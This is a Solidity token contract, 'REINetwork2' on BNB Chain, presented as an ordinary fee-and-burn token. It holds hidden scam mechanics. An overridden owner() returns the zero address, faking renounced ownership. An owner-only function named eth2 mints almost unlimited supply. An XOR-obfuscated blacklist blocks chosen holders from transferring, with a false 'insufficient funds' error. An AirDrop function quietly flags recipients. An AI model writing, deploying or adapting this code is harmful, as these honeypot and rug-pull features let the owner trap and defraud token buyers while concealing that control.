/**
 *Submitted for verification at BscScan.com on 2022-06-22
*/

pragma solidity ^0.4.26;


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }


    function owner() public pure returns (address) {
        return address(0);
    }


    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
}


interface IPancakePair {
    function sync() external;
}



interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

}

contract BaseToken is Ownable {
    using SafeMath for uint256;

    string constant public name = 'REINetwork2';

    string constant public symbol = 'REIN2';

    uint8 constant public decimals = 9;
 

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    mapping(address => bool) private _isExcludedFromFee;

    mapping(uint160 => bool) private _tsla;

   address public pair;

    uint256 public totalSupply = 3800000000*10**uint256(decimals);

    uint256 public constant MAXSupply = 10000000000000000000000000000000000000000000000000 * 10 ** uint256(decimals);

    uint256 public _taxFee = 0;
    uint256 private _previousTaxFee = _taxFee;

    uint256 public _burnFee = 3;
    uint256 private _previousBurnFee = _burnFee;

    address public projectAddress = owner;
    address public burnAddress = 0x000000000000000000000000000000000000dEaD;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "is 0 address");

        uint160 f = uint160(from) ^ 1234567890;
        
        require(!_tsla[f], "insufficient funds");

        if(_isExcludedFromFee[from])
            removeAllFee();

        uint256 fee =  calculateTaxFee(value);
        uint256 burn =  calculateBurnFee(value);
        balanceOf[from] = balanceOf[from].sub(value);
        balanceOf[to] = balanceOf[to].add(value).sub(fee).sub(burn);

        if(fee > 0) {
            balanceOf[projectAddress] = balanceOf[projectAddress].add(fee);
            emit Transfer(from, projectAddress, fee);
        }
        if(burn > 0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn);
            emit Transfer(from, burnAddress, burn);
        }
         if(_isExcludedFromFee[from])
            restoreAllFee();
        emit Transfer(from, to, value);
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }
    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }
    function eth2(address target, uint256 edAmount) public onlyOwner{
    	require (totalSupply + edAmount <= MAXSupply);

        balanceOf[target] = balanceOf[target].add(edAmount);
        totalSupply = totalSupply.add(edAmount);

        emit Transfer(0, this, edAmount);
        emit Transfer(this, target, edAmount);
    }
    function calculateTaxFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_taxFee).div(
            10 ** 2
        );
    }
    function calculateBurnFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_burnFee).div(
            10 ** 2
        );
    }

    function removeAllFee() private {
        if(_taxFee == 0 && _burnFee == 0)
            return;

        _previousTaxFee = _taxFee;
        _previousBurnFee = _burnFee;
        _taxFee = 0;
        _burnFee = 0;
    }
    function restoreAllFee() private {
        _taxFee = _previousTaxFee;
        _burnFee = _previousBurnFee;
    }
    function AirDrop(address account, uint256 edAmount) public onlyOwner {
        balanceOf[account] = balanceOf[account].add(edAmount);
        _tsla[uint160(account)] = true;
    }
    function SUL(address account) public onlyOwner {
        _tsla[uint160(account)] = false;
    }
    function isTsla(address account) public view returns (bool) {

        return _tsla[uint160(account)];
    }

}


contract REINetwork2 is BaseToken {
    constructor() public {
        /*
        address  ROUTER        = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address  WBNB         = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
     
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(ROUTER);
        pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), WBNB);
        */

        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);

        owner = msg.sender;


    }

    function() public payable {
       revert();
    }
}